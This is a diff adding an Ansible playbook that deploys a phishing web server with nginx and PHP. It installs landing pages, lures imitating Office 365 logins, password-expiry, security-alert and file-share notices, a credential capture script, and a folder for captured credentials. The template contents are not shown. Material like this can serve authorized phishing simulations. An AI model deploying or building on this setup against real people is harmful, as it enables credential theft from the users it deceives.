@@ -1,0 +1,85 @@
+---
+# Configure phishing web server with landing pages and credential capture
+
+- name: Install required packages
+  apt:
+    name:
+      - nginx
+      - php-fpm
+      - php-json
+      - certbot
+      - python3-certbot-nginx
+    state: present
+    update_cache: yes
+
+- name: Create web directories
+  file:
+    path: "{{ item }}"
+    state: directory
+    mode: '0755'
+    owner: www-data
+    group: www-data
+  loop:
+    - /var/www/phishing
+    - /var/www/phishing/templates
+    - /var/www/phishing/static
+    - /var/www/phishing/captures
+    - /var/private/phishing_creds
+
+- name: Deploy phishing templates
+  template:
+    src: "{{ item.src }}"
+    dest: "{{ item.dest }}"
+    mode: '0644'
+    owner: www-data
+    group: www-data
+  loop:
+    - { src: "../templates/phishing/phishing-landing-page.j2", dest: "/var/www/phishing/index.html" }
+    - { src: "../templates/phishing/email-templates/office365_login.j2", dest: "/var/www/phishing/templates/o365.html" }
+    - { src: "../templates/phishing/email-templates/password_expiry.j2", dest: "/var/www/phishing/templates/password.html" }
+    - { src: "../templates/phishing/email-templates/security_alert.j2", dest: "/var/www/phishing/templates/security.html" }
+    - { src: "../templates/phishing/email-templates/file_share.j2", dest: "/var/www/phishing/templates/share.html" }
+
+- name: Deploy credential capture script
+  template:
+    src: "../templates/phishing/capture.php.j2"
+    dest: "/var/www/phishing/capture.php"
+    mode: '0640'
+    owner: www-data
+    group: www-data
+
+- name: Configure NGINX for phishing sites
+  template:
+    src: "../templates/phishing/nginx-phishing-webserver.j2"
+    dest: /etc/nginx/sites-available/phishing
+    mode: '0644'
+
+- name: Enable phishing site
+  file:
+    src: /etc/nginx/sites-available/phishing
+    dest: /etc/nginx/sites-enabled/phishing
+    state: link
+
+- name: Remove default nginx site
+  file:
+    path: /etc/nginx/sites-enabled/default
+    state: absent
+
+- name: Configure PHP-FPM for security
+  lineinfile:
+    path: /etc/php/7.4/fpm/php.ini
+    regexp: "{{ item.regexp }}"
+    line: "{{ item.line }}"
+  loop:
+    - { regexp: '^expose_php', line: 'expose_php = Off' }
+    - { regexp: '^display_errors', line: 'display_errors = Off' }
+    - { regexp: '^log_errors', line: 'log_errors = On' }
+
+- name: Restart services
+  systemd:
+    name: "{{ item }}"
+    state: restarted
+    enabled: yes
+  loop:
+    - nginx
+    - php7.4-fpm
